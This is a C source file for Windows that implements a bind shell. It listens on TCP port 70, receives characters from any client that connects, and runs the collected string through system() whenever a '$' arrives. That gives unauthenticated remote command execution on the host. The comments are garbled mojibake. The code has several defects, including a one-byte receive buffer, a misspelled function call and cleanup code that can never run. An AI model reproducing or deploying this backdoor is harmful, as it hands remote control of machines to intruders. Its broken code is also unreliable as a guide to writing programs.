#include <stdio.h>
#include <stdlib.h>
#include<windows.h>
#include<winsock2.h>
#pragma comment(lib,"ws2_32.lib")

void TCPserver()
{
    //��ʼ��WSAData
    WSADATA data;
    WORD v=MAKEWORD(2,0);
    WSAStartup(v,&data);
    //�����׽���
    SOCKET s1,s2;
    s1=socket(AF_INET,SOCK_STREAM,0);
    //��ַ���˿ڳ�ʼ��
    SOCKADDR_IN addr1,addr2;
    addr1.sin_family=AF_INET;
    addr1.sin_port=htons(70);
    //����Զ��������ַ
    addr1.sin_addr.S_un.S_addr=INADDR_ANY;
    //�󶨵��˿�
    bind(s1,(SOCKADDR*)&addr1,sizeof(addr1));
    //����
    listen(s1,5);
    char str2[]="";
    printf("����������!");

    //��������
    while(1)
    {
        int size=sizeof(addr2);
        s2=accept(s1,(SOCKADDR*)&addr2,&size);
        if(s2!=NULL)
        {
            printf("[*]%s���ӵ�����SHELL\n",inet_ntoa(addr2.sin_addr));
         }

/***********************���Ĳ���****************************/
char cmd[100]="";    //����һ����������ַ���
       while(1)
       {
           recv(s2,str2,sizeof(str2),0);
          	//print("str2=%s",str2);//������
            if(!strcmp(str2,"$"))//���str2�Ƿ�Ϊ$,����Ϊ�����������������ִ����������ڱ�д��������ʱ�򣬸����ֵ��β��һ��'$',�����Ϊ�жϡ�
            {
                //print("cmd=%s",cmd);//������
                system(cmd);		//��ϵͳ�����д���
                //strcpy(cmd,"");//cmd����//�����λ�����㲻����
            }
            sscanf(str2,"%1s",str2);//�ǳ��ؼ��ĺ�����ȡstr2�ַ����ĵ�һ���ַ���str2������������������ַ�+�ո���ɡ�����������ping������ͻ��ɡ�p i n g ��
            strcat(cmd,str2);  //�����յ����ַ���str2�����ӵ�cmd�ַ���ĩβ

            if(!strcmp(str2,"$"))
            {
                strcpy(cmd,"");//�ٴ����㣬ȥ��$
            }
        }

}
/***************************************************/
    //�ر�TCP����
closesocket(s1);
    closesocket(s2);
    WSACleanup();
    if(getcahr())
    {
        return 0;
    }
    else
    {
        Sleep(100);
    }

}

int main()
{
    system("color f5");//�ı�ϵͳ��ɫ
    TCPserver();


    return 0;
}
